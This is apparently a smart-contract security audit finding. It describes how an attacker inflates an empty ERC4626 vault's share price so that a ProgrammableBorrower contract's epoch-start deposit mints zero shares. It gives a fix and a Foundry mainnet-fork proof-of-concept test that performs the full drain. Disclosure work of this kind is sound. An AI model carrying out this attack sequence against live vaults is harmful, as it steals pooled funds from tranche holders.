### Title
Unchecked ERC4626 deposit lets the first depositor steal programmable-borrower liquidity - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` deposits all pool liquidity into the configured ERC4626 vault but never validates that the deposit minted nonzero shares or preserved the deposited asset value. An attacker can inflate an empty vault’s share price before epoch start, cause the borrower deposit to mint zero shares, and then redeem the only outstanding share for both the donation and the pool’s deposit. Vault initialization checks only that the asset matches the CDO token, not that the vault already has safe share supply or that deposits are economically valid. [1](#0-0) [2](#0-1) 

### Finding Description
`IdleCDOEpochVariant.startEpoch()` transfers surplus pool funds to the programmable borrower and then invokes `onStartEpoch`. [3](#0-2)  `onStartEpoch` snapshots the borrower’s pre-deposit cash plus existing vault position as `startAssets`, deposits every idle underlying token into the ERC4626 vault, and records that pre-deposit amount as `epochStartVaultAssets`. [4](#0-3)  `_depositToVault` captures the returned share amount only for an event and does not require `shares > 0`, enforce a minimum share amount, or compare the deposited assets to the value represented by the received shares. [5](#0-4) 

For a newly configured or empty ERC4626 vault, an attacker can deposit one underlying unit to receive one share and then transfer `C` underlying directly to the vault. The vault then has one share backed by `C + 1` assets. When `ProgrammableBorrower` deposits `C` pool assets, ERC4626 share math mints `C * 1 / (C + 1) == 0` shares. The attacker redeems their one share and receives `2C + 1`, netting the full `C` deposited by the pool.

The accounting error is initially hidden because `epochStartVaultAssets` was taken before the deposit rather than from the shares actually received. Subsequent accounting reads `_currentVaultAssets()`, which correctly sees that the borrower owns zero vault shares. [6](#0-5)  On a later stop or close, `onStopEpoch` cannot withdraw the missing liquidity, and `IdleCDOEpochVariant` falls into the borrower-default path when its transfer from the borrower fails. [7](#0-6) [8](#0-7) 

### Impact Explanation
The attacker directly steals the programmable borrower’s entire first epoch deposit, `C` underlying tokens. Because `epochStartVaultAssets` still treats the stolen deposit as principal, strategy-token backing remains recorded until pending withdrawals or a close-pool settlement expose the shortfall. Successful withdrawal funding then reverts and triggers `defaulted = true`; with no recovered funds, `finalizeDefault` can crystallize a zero recovery price, leaving tranche holders with the loss. The invariant violated is one deposited principal unit must produce redeemable vault claim value; here `C` assets are consumed while the borrower receives zero shares. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The exploit requires the configured vault to be empty or sufficiently supply-constrained that attacker donations can inflate its share price, and the attacker must act before the first borrower deposit. That role is available to an ordinary ERC4626 depositor and direct underlying sender. Owner and manager calls remain honest and merely execute the normal `initialize`, `startEpoch`, or `setVault` sequence. No existing check prevents this: initialization validates only the asset, `setVault` validates only the asset and absence of old shares, and `_depositToVault` performs no share-amount or post-deposit value validation. [11](#0-10) [12](#0-11) [2](#0-1) 

### Recommendation
Validate the vault deposit result in `_depositToVault`:

```solidity
uint256 sharesBefore = vault.balanceOf(address(this));
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0 || vault.balanceOf(address(this)) - sharesBefore != shares) {
  revert InvalidAmount();
}
if (vault.convertToAssets(shares) + depositRoundingTolerance < _assetAmount) {
  revert InvalidAmount();
}
```

Also reject zero-total-supply vaults in `initialize` and `setVault`, or require the operator to initialize the vault with a protected seed deposit before approving it. If vaults may legitimately mint shares with different economics, store `assetsBefore`, `assetsAfter`, and the vault asset delta rather than trusting the nominal deposit amount.

### Proof of Concept
The following Foundry test reproduces the share-inflation drain on a mainnet fork using USDC as the underlying and a standard ERC4626 implementation. The test contract acts as the configured CDO only to supply `token()` and invoke `onStartEpoch`; the attacker uses only public vault deposit, direct transfer, and redeem calls.

```solidity
// test/foundry/ProgrammableBorrowerFirstDeposit.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract Fork4626 is ERC4626 {
  constructor(IERC20 asset_)
    ERC20("Fork Vault Share", "fv")
    ERC4626(asset_)
  {}
}

contract ProgrammableBorrowerFirstDepositPoC is Test {
  address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  ProgrammableBorrower internal borrowerAdapter;
  Fork4626 internal vault;
  address internal attacker = makeAddr("attacker");

  // ProgrammableBorrower.initialize reads the CDO's underlying through token().
  function token() external view returns (address) {
    return USDC;
  }

  function testInflatedFirstDepositDrainsStartLiquidity() external {
    vm.createSelectFork(vm.envString("MAINNET_RPC"), 19_225_935);

    vault = new Fork4626(IERC20(USDC));
    borrowerAdapter = new ProgrammableBorrower();
    borrowerAdapter.initialize(
      address(vault),
      address(this), // configured IdleCDO caller
      makeAddr("owner"),
      makeAddr("manager"),
      makeAddr("realBorrower"),
      0
    );

    uint256 poolDeposit = 1_000_000e6;

    // Attacker creates the first share and donates poolDeposit directly to the vault.
    deal(USDC, attacker, poolDeposit + 1);
    vm.startPrank(attacker);
    IERC20(USDC).approve(address(vault), 1);
    vault.deposit(1, attacker);                 // attacker owns the only share
    IERC20(USDC).transfer(address(vault), poolDeposit);
    vm.stopPrank();

    // Honest epoch-start flow delivers poolDeposit and ProgrammableBorrower deposits it.
    deal(USDC, address(borrowerAdapter), poolDeposit);
    borrowerAdapter.onStartEpoch(0);

    // poolDeposit * 1 / (poolDeposit + 1) rounds to zero shares.
    assertEq(vault.balanceOf(address(borrowerAdapter)), 0);

    // The sole attacker share now claims donation + stolen pool deposit.
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertEq(IERC20(USDC).balanceOf(attacker), 2 * poolDeposit + 1);
    assertEq(IERC20(USDC).balanceOf(address(vault)), 0);
  }
}
```

Run with:

```bash
forge test --match-test testInflatedFirstDepositDrainsStartLiquidity --fork-url "$MAINNET_RPC" -vv
```
